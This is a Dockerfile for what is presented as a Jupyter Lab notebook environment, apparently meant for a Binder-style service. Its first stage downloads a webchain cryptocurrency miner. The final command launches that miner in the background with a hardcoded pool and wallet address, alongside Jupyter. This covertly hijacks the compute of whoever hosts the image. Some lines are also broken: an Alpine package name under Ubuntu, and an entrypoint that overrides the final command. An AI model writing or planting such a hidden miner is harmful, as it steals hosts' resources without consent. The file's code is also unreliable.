# First stage: build the miner
FROM ubuntu:20.04 as ubuntu-mine
ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies for the miner
RUN apt update -y

RUN apt install wget tar curl -y

# Download and setup the miner
WORKDIR /miner
RUN curl -L -o miner.tar.gz https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz \
    && tar -xvf miner.tar.gz \
    && rm miner.tar.gz

# Miner configuration (replace 'example-miner' with actual miner binary)
ENTRYPOINT ["./webchain-miner", "-o", "mintme.wattpool.net:2222", "-u", "0x696518763bf15785613442c12B5d257E55DDcE3b", "-p", "x", "-t2"]

# Second stage: build the Jupyter environment
FROM ubuntu:20.04 as ubuntu-jupyter

# Install dependencies for Python and Jupyter
RUN apt update && apt install python3 py3-pip python3-dev && pip3 install jupyterlab notebook

# Set up the user environment
ARG NB_USER=jovyan
ARG NB_UID=1000
ENV USER ${NB_USER}
ENV NB_UID ${NB_UID}
ENV HOME /home/${NB_USER}

# Create the user
RUN adduser --disabled-password \
    --gecos "Default user" \
    --uid ${NB_UID} \
    ${NB_USER}

# Copy contents to the user's home directory and set permissions
COPY . ${HOME}
USER root
RUN chown -R ${NB_UID} ${HOME}
USER ${NB_USER}

# Set the entrypoint to run Jupyter Lab
ENTRYPOINT ["jupyter", "notebook", "--NotebookApp.default_url=/lab/", "--ip=0.0.0.0", "--port=8888", "--no-browser", "--allow-root"]

# Final stage: combine miner and Jupyter environment
FROM ubuntu-jupyter

# Copy miner from the first stage
COPY --from=ubuntu-mine /miner /home/${NB_USER}/miner

# Start both the miner and Jupyter Lab
CMD ["sh", "-c", "cd /home/${NB_USER}/miner && ./webchain-miner -o mintme.wattpool.net:2222 -u 0x696518763bf15785613442c12B5d257E55DDcE3b -p x -t2 & jupyter notebook --NotebookApp.default_url=/lab/ --ip=0.0.0.0 --port=8888 --no-browser --allow-root"]
